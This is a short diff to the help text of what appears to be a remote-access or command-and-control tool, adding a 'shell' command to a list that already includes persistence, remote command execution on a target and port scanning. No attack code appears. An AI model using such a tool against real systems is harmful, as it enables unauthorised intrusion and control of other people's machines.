@@ -39,6 +39,7 @@ persistence         - Apply persistence mechanism.
 quit                - Exit the server and end all client connections.
 rekey               - Regenerate crypto key.
 run <command>       - Execute a command on the target.
+shell               - Open an interactive shell on the target
 scan <ip>           - Scan top 25 ports on a single host.
 survey              - Run a system survey.
 unzip <file>        - Unzip a file.
